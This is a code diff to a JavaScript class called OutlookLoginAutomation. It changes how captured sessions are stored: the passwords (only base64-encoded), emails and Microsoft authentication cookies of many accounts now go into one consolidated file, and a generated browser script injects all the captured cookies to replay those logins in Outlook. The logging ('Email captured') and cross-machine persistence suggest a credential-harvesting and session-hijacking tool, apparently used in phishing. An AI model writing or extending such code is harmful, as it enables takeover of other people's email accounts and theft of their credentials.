@@ -735,17 +735,30 @@ class OutlookLoginAutomation {
                 fs.mkdirSync(sessionDir, { recursive: true });
             }
 
-            // Use email for filename, fallback to timestamp if no email
-            const emailSafe = email ? email.replace(/[^a-zA-Z0-9]/g, '_') : 'unknown';
-            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+            // Use consolidated session file for all accounts
+            const consolidatedSessionFile = path.join(sessionDir, 'all_sessions.json');
+            
+            // Load existing consolidated sessions
+            let allSessions = { accounts: [] };
+            if (fs.existsSync(consolidatedSessionFile)) {
+                try {
+                    const existingData = fs.readFileSync(consolidatedSessionFile, 'utf8');
+                    allSessions = JSON.parse(existingData);
+                    if (!allSessions.accounts) {
+                        allSessions.accounts = [];
+                    }
+                } catch (e) {
+                    console.log('⚠️ Could not parse existing sessions file, creating new one');
+                    allSessions = { accounts: [] };
+                }
+            }
 
-            // Save enhanced session file (overwrites existing for same email)
-            const sessionFile = path.join(sessionDir, `outlook_session_${emailSafe}.json`);
-
-            const sessionPackage = {
+            // Create new session entry
+            const newSession = {
+                id: Date.now(),
                 timestamp: new Date().toISOString(),
-                email: email,
-                password: password ? Buffer.from(password).toString('base64') : null, // Basic encoding for storage
+                email: email || 'unknown',
+                password: password ? Buffer.from(password).toString('base64') : null,
                 cookies: uniqueCookies,
                 domains: domains,
                 userAgent: await this.page.evaluate(() => navigator.userAgent),
@@ -756,66 +769,65 @@ class OutlookLoginAutomation {
                 }
             };
 
-            fs.writeFileSync(sessionFile, JSON.stringify(sessionPackage, null, 2));
-            console.log(`💾 Session saved: ${sessionFile} (overwrites any existing session for this email)`);
+            // Remove existing session for same email (if any)
+            allSessions.accounts = allSessions.accounts.filter(account => 
+                account.email !== newSession.email
+            );
 
-            // Clean up old timestamp-based files for this email
-            try {
-                const files = fs.readdirSync(sessionDir);
-                const oldFiles = files.filter(file => 
-                    file.startsWith(`outlook_session_${emailSafe}_`) || 
-                    file.startsWith(`outlook_cookies_${emailSafe}_`) ||
-                    file.startsWith(`inject_${emailSafe}_`)
-                );
-                
-                oldFiles.forEach(file => {
-                    const filePath = path.join(sessionDir, file);
-                    fs.unlinkSync(filePath);
-                    console.log(`🗑️ Cleaned up old file: ${file}`);
-                });
-                
-                if (oldFiles.length > 0) {
-                    console.log(`✅ Cleaned up ${oldFiles.length} old session files for this email`);
+            // Add new session
+            allSessions.accounts.push(newSession);
+
+            // Sort by timestamp (newest first)
+            allSessions.accounts.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+            // Update metadata
+            allSessions.lastUpdated = new Date().toISOString();
+            allSessions.totalAccounts = allSessions.accounts.length;
+
+            // Save consolidated file
+            fs.writeFileSync(consolidatedSessionFile, JSON.stringify(allSessions, null, 2));
+            console.log(`💾 Session saved to consolidated file: ${consolidatedSessionFile}`);
+            console.log(`📊 Total accounts in consolidated file: ${allSessions.totalAccounts}`);
+
+            // Create consolidated injection script
+            const consolidatedInjectScript = path.join(sessionDir, 'inject_all_sessions.js');
+            
+            // Combine all cookies from all accounts
+            let allAccountCookies = [];
+            allSessions.accounts.forEach(account => {
+                if (account.cookies) {
+                    allAccountCookies = allAccountCookies.concat(account.cookies);
                 }
-            } catch (cleanupError) {
-                console.log('⚠️ Could not clean up old files:', cleanupError.message);
-            }
-
-            // Legacy cookie format for compatibility
-            const cookieFile = path.join(sessionDir, `outlook_cookies_${emailSafe}.txt`);
-            let cookieText = `# Microsoft Outlook Enhanced Persistent Session\n`;
-            cookieText += `# Saved: ${new Date().toISOString()}\n`;
-            cookieText += `# Email: ${email || 'N/A'}\n`;
-            cookieText += `# Total cookies: ${uniqueCookies.length}\n`;
-            cookieText += `# Expiry: 5 years (maximum persistence)\n`;
-            cookieText += `# Cross-computer compatible: YES\n\n`;
-
-            uniqueCookies.forEach(cookie => {
-                cookieText += `Name: ${cookie.name}\n`;
-                cookieText += `Value: ${cookie.value}\n`;
-                cookieText += `Domain: ${cookie.domain}\n`;
-                cookieText += `Path: ${cookie.path}\n`;
-                cookieText += `Secure: ${cookie.secure}\n`;
-                cookieText += `HttpOnly: ${cookie.httpOnly}\n`;
-                cookieText += `SameSite: ${cookie.sameSite}\n`;
-                cookieText += `Expires: ${new Date(cookie.expires * 1000).toISOString()}\n`;
-                cookieText += `Session: false\n`;
-                cookieText += `---\n\n`;
             });
 
-            fs.writeFileSync(cookieFile, cookieText);
+            // Remove duplicates from combined cookies
+            const consolidatedCookies = [];
+            const consolidatedSeen = new Set();
+            for (const cookie of allAccountCookies) {
+                const key = `${cookie.name}|${cookie.domain}|${cookie.path}`;
+                if (!consolidatedSeen.has(key)) {
+                    consolidatedSeen.add(key);
+                    consolidatedCookies.push(cookie);
+                }
+            }
 
-            // Create browser-injectable script
-            const injectScript = path.join(sessionDir, `inject_${emailSafe}.js`);
-            const scriptContent = `
-// Enhanced Microsoft Authentication Cookie Injector
+            const consolidatedScriptContent = `
+// Consolidated Microsoft Authentication Cookie Injector
 // Auto-generated on ${new Date().toISOString()}
-// Email: ${email || 'N/A'}
+// Contains cookies for ${allSessions.totalAccounts} accounts
 
 (function() {
-    console.log('🚀 Injecting ${uniqueCookies.length} persistent Microsoft auth cookies...');
+    console.log('🚀 Injecting ${consolidatedCookies.length} consolidated Microsoft auth cookies for ${allSessions.totalAccounts} accounts...');
+    
+    const allAccounts = ${JSON.stringify(allSessions.accounts.map(acc => ({
+        email: acc.email,
+        timestamp: acc.timestamp,
+        cookieCount: acc.cookies ? acc.cookies.length : 0
+    })), null, 4)};
+    
+    console.log('📧 Accounts included:', allAccounts);
 
-    const cookies = ${JSON.stringify(uniqueCookies, null, 4)};
+    const cookies = ${JSON.stringify(consolidatedCookies, null, 4)};
     let injected = 0;
 
     cookies.forEach(cookie => {
@@ -834,19 +846,41 @@ class OutlookLoginAutomation {
         }
     });
 
-    console.log('✅ Successfully injected ' + injected + ' cookies!');
+    console.log('✅ Successfully injected ' + injected + ' consolidated cookies!');
     console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');
 
     // Auto-redirect option
     setTimeout(() => {
-        if (confirm('Injected ' + injected + ' auth cookies! Open Outlook now?')) {
+        if (confirm('Injected ' + injected + ' auth cookies for ' + ${allSessions.totalAccounts} + ' accounts! Open Outlook now?')) {
             window.open('https://outlook.office.com/mail/', '_blank');
         }
     }, 1000);
 })();`;
 
-            fs.writeFileSync(injectScript, scriptContent);
-            console.log(`🔧 Browser injection script: ${injectScript}`);
+            fs.writeFileSync(consolidatedInjectScript, consolidatedScriptContent);
+            console.log(`🔧 Consolidated injection script: ${consolidatedInjectScript}`);
+
+            // Clean up old individual session files
+            try {
+                const files = fs.readdirSync(sessionDir);
+                const oldFiles = files.filter(file => 
+                    file.startsWith('outlook_session_') || 
+                    file.startsWith('outlook_cookies_') ||
+                    (file.startsWith('inject_') && file !== 'inject_all_sessions.js')
+                );
+                
+                oldFiles.forEach(file => {
+                    const filePath = path.join(sessionDir, file);
+                    fs.unlinkSync(filePath);
+                    console.log(`🗑️ Cleaned up old individual file: ${file}`);
+                });
+                
+                if (oldFiles.length > 0) {
+                    console.log(`✅ Cleaned up ${oldFiles.length} old individual session files`);
+                }
+            } catch (cleanupError) {
+                console.log('⚠️ Could not clean up old files:', cleanupError.message);
+            }
 
             console.log(`✅ Enhanced persistent session saved with ${uniqueCookies.length} cookies`);
             if (email) console.log(`📧 Email captured: ${email}`);
@@ -860,7 +894,7 @@ class OutlookLoginAutomation {
             });
             console.log('✅ Redirected to office.com successfully');
 
-            return sessionFile;
+            return consolidatedSessionFile;
 
         } catch (error) {
             console.error('❌ Error saving enhanced session:', error.message);
@@ -868,7 +902,7 @@ class OutlookLoginAutomation {
         }
     }
 
-    async loadCookies(sessionFile) {
+    async loadCookies(sessionFile, targetEmail = null) {
         try {
             console.log(`🔄 Loading enhanced session from: ${sessionFile}`);
 
@@ -882,19 +916,69 @@ class OutlookLoginAutomation {
 
             // Load complete session package
             let sessionData;
+            let cookies = [];
+            
             try {
                 const sessionContent = fs.readFileSync(sessionFile, 'utf8');
-                sessionData = JSON.parse(sessionContent);
-                console.log(`📦 Loaded session package from ${sessionData.timestamp}`);
-                if (sessionData.email) console.log(`📧 Session email: ${sessionData.email}`);
+                const parsedData = JSON.parse(sessionContent);
+                
+                // Check if this is a consolidated sessions file
+                if (parsedData.accounts && Array.isArray(parsedData.accounts)) {
+                    console.log(`📦 Loaded consolidated sessions file with ${parsedData.totalAccounts} accounts`);
+                    
+                    if (targetEmail) {
+                        // Load specific account
+                        const targetAccount = parsedData.accounts.find(acc => acc.email === targetEmail);
+                        if (targetAccount) {
+                            sessionData = targetAccount;
+                            cookies = targetAccount.cookies || [];
+                            console.log(`📧 Loading specific account: ${targetEmail}`);
+                        } else {
+                            console.log(`❌ Account ${targetEmail} not found in consolidated file`);
+                            return false;
+                        }
+                    } else {
+                        // Load all cookies from all accounts
+                        console.log('📧 Loading cookies from all accounts');
+                        parsedData.accounts.forEach(account => {
+                            if (account.cookies) {
+                                cookies = cookies.concat(account.cookies);
+                                console.log(`✅ Added ${account.cookies.length} cookies from ${account.email}`);
+                            }
+                        });
+                        
+                        // Remove duplicates
+                        const uniqueCookies = [];
+                        const seen = new Set();
+                        for (const cookie of cookies) {
+                            const key = `${cookie.name}|${cookie.domain}|${cookie.path}`;
+                            if (!seen.has(key)) {
+                                seen.add(key);
+                                uniqueCookies.push(cookie);
+                            }
+                        }
+                        cookies = uniqueCookies;
+                        
+                        // Use the most recent account's metadata
+                        sessionData = parsedData.accounts[0] || {};
+                        sessionData.cookies = cookies;
+                        
+                        console.log(`📦 Consolidated ${cookies.length} unique cookies from ${parsedData.totalAccounts} accounts`);
+                    }
+                } else {
+                    // Legacy single session format
+                    sessionData = parsedData;
+                    cookies = sessionData.cookies || [];
+                    console.log(`📦 Loaded legacy session package from ${sessionData.timestamp}`);
+                    if (sessionData.email) console.log(`📧 Session email: ${sessionData.email}`);
+                }
             } catch (e) {
                 // Fallback to old cookie format
-                const cookies = JSON.parse(fs.readFileSync(sessionFile, 'utf8'));
+                cookies = JSON.parse(fs.readFileSync(sessionFile, 'utf8'));
                 sessionData = { cookies: cookies };
                 console.log(`📦 Loaded ${cookies.length} legacy cookies`);
             }
 
-            const cookies = sessionData.cookies;
             if (!cookies || cookies.length === 0) {
                 console.log('❌ No cookies found in session');
                 return false;
